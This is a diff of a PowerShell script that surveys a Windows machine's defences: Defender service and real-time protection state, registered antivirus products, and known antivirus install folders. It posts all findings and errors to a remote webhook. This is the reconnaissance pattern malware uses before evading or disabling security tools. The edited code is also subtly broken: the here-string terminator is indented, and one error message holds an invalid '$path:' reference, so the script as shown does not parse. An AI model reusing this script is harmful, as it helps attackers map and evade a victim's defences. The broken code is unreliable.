@@ -14,30 +14,60 @@ function Send-WebhookMessage {
 Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 
 try {
-    $DefenderService = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
-    $DefenderStatus = if ($DefenderService) { $DefenderService.Status } else { 'Not Installed' }
+    try {
+        $DefenderService = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
+        $DefenderStatus = if ($DefenderService) { $DefenderService.Status } else { 'Not Installed' }
+    } catch {
+        $DefenderStatus = 'Error retrieving status'
+        Send-WebhookMessage -Message "Error getting Defender service status: $_"
+    }
 
-    $DefenderRealtime = try { Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring } catch { 'Unavailable' }
+    try {
+        $DefenderRealtime = Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring
+    } catch {
+        $DefenderRealtime = 'Unavailable'
+        Send-WebhookMessage -Message "Error getting Defender real-time protection status: $_"
+    }
 
-    $InstalledAV = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntiVirusProduct" | 
-        Select-Object displayName, productState, pathToSignedProductExe
+    try {
+        $InstalledAV = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntiVirusProduct" -ErrorAction SilentlyContinue | 
+            Select-Object displayName, productState, pathToSignedProductExe
+    } catch {
+        $InstalledAV = $null
+        Send-WebhookMessage -Message "Error retrieving installed antivirus products: $_"
+    }
 
-    $DefenderExe = Get-Command "C:\Program Files\Windows Defender\MsMpEng.exe" -ErrorAction SilentlyContinue
-    $DefenderExeStatus = if ($DefenderExe) { 'Yes' } else { 'No' }
+    try {
+        $DefenderExe = Get-Command "C:\Program Files\Windows Defender\MsMpEng.exe" -ErrorAction SilentlyContinue
+        $DefenderExeStatus = if ($DefenderExe) { 'Yes' } else { 'No' }
+    } catch {
+        $DefenderExeStatus = 'Error checking executable'
+        Send-WebhookMessage -Message "Error checking Defender executable: $_"
+    }
 
-    $WinDefendReg = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -ErrorAction SilentlyContinue
-    $RegStatus = if ($WinDefendReg) { 'Yes' } else { 'No' }
+    try {
+        $WinDefendReg = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -ErrorAction SilentlyContinue
+        $RegStatus = if ($WinDefendReg) { 'Yes' } else { 'No' }
+    } catch {
+        $RegStatus = 'Error checking registry'
+        Send-WebhookMessage -Message "Error accessing Windows Defender registry: $_"
+    }
 
-    $avInfo = if ($InstalledAV) {
-        ($InstalledAV | ForEach-Object { 
-            $state = switch ($_.'productState') {
-                397568 { 'Enabled' }
-                266240 { 'Disabled' }
-                Default { $_.'productState' }
-            }
-            "   $($_.displayName) Status $state Path $($_.pathToSignedProductExe)"
-        }) -join "`n"
-    } else { "  None detected" }
+    try {
+        $avInfo = if ($InstalledAV) {
+            ($InstalledAV | ForEach-Object { 
+                $state = switch ($_.productState) {
+                    397568 { 'Enabled' }
+                    266240 { 'Disabled' }
+                    Default { "Unknown ($($_.productState))" }
+                }
+                "   $($_.displayName) Status $state Path $($_.pathToSignedProductExe)"
+            }) -join "`n"
+        } else { "   None detected" }
+    } catch {
+        $avInfo = "   Error processing antivirus info"
+        Send-WebhookMessage -Message "Error processing antivirus product info: $_"
+    }
 
     $knownAVPaths = @(
         "$env:ProgramFiles\AVAST Software", "$env:ProgramFiles(x86)\AVAST Software",
@@ -107,26 +137,39 @@ try {
 
     $pathAVs = @()
     foreach ($path in $knownAVPaths) {
-        if (Test-Path $path) { $pathAVs += $path }
+        try {
+            if (Test-Path $path -ErrorAction SilentlyContinue) {
+                $pathAVs += $path
+            }
+        } catch {
+            Send-WebhookMessage -Message "Error checking path $path: $_"
+        }
     }
 
-    $pathAVsInfo = if ($pathAVs) { $pathAVs -join "`n" } else { "   None detected" }
-
+    try {
+        $pathAVsInfo = if ($pathAVs) { $pathAVs -join "`n" } else { "   None detected" }
+    } catch {
+        $pathAVsInfo = "   Error processing path info"
+        Send-WebhookMessage -Message "Error processing antivirus path info: $_"
+    }
 
     $message = @"
-=== Windows Defender Info ===
-Service Status $DefenderStatus
-Real-Time Protection Disabled $DefenderRealtime
-Defender Executable Found $DefenderExeStatus
-Defender Registered in Registry $RegStatus
-Installed Antivirus Products (Security Center)
+    === Windows Defender Info ===
+    Service Status: $DefenderStatus
+    Real-Time Protection Disabled: $DefenderRealtime
+    Defender Executable Found: $DefenderExeStatus
+    Defender Registered in Registry: $RegStatus
+    Installed Antivirus Products (Security Center):
     $avInfo
-
-Installed Antivirus Products (By Path)
+    Installed Antivirus Products (By Path):
     $pathAVsInfo
-"@
+    "@
 
-    Send-WebhookMessage -Message $message
+    try {
+        Send-WebhookMessage -Message $message
+    } catch {
+        Write-Error "Failed to send webhook message: $_"
+    }
 
 
     
